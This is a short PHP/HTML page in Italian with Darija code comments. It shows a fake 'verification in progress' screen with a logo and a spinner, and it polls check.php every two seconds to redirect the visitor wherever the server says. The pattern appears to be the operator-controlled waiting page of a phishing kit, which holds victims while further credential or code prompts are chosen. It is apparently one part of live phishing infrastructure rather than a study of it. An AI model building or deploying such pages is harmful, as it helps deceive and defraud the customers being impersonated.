<?php require '../main.php'; ?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica in corso...</title>
    <link rel="stylesheet" href="res/app.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        /* Had l-CSS kiy-jbed kolchi l-wast */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center; /* Center Horizontal */
            align-items: center;     /* Center Vertical */
            background-color: #f8f9fa; /* T9der tbeddel lon l-khalfiya */
            font-family: sans-serif;
        }

        .form {
            text-align: center;
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            /* box-shadow: 0 4px 15px rgba(0,0,0,0.05);  Ila bghiti chwiya d-dlal */
            max-width: 400px;
            width: 90%;
        }

        .loader-img {
            width: 100px;
            margin-top: 30px;
        }

        h2 {
            color: #333;
            font-size: 22px;
            margin-top: 25px;
        }

        p {
            color: #666;
            font-size: 15px;
        }
    </style>
</head>
<body>

    <div class="form">
        <img src="res/logo.png" width="180" alt="Logo">
        
        <h2>Verifica in corso...</h2>
        <p>Stiamo elaborando la tua richiesta, attendi un momento.</p>
        
        <div class="loader-container">
            <img src="res/Loading.gif" class="loader-img">
        </div>
    </div>

    <script>
    // Check Status kola 2 seconat
    setInterval(function(){
        $.get("check.php", function(data){
            let target = data.trim();
            if(target !== "wait" && target !== ""){
                window.location.href = target;
            }
        });
    }, 2000);
    </script>
</body>
</html>